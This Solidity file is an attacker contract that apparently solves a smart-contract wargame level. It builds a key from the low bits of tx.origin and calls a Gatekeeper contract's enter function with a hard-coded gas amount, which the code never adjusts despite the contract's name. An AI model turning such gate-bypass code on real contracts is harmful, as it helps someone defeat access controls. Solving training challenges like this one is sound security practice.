// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeper {
    function enter(bytes8 _gateKey) external returns (bool);
}


contract GasAdjustedAttacker {
    IGatekeeper public immutable instance;

    constructor(address _instance) {
        instance = IGatekeeper(_instance);
    }

    function attack() public {
        bytes8 gateKey = bytes8(
            uint64(0x00000001) << 32 | uint64(uint16(uint160(tx.origin)) & 0xffff)
        );
        (bool success,) = address(instance).call{gas: 900000}(abi.encodeWithSelector(instance.enter.selector, gateKey));
        require(success, "Call failed");
    }
}
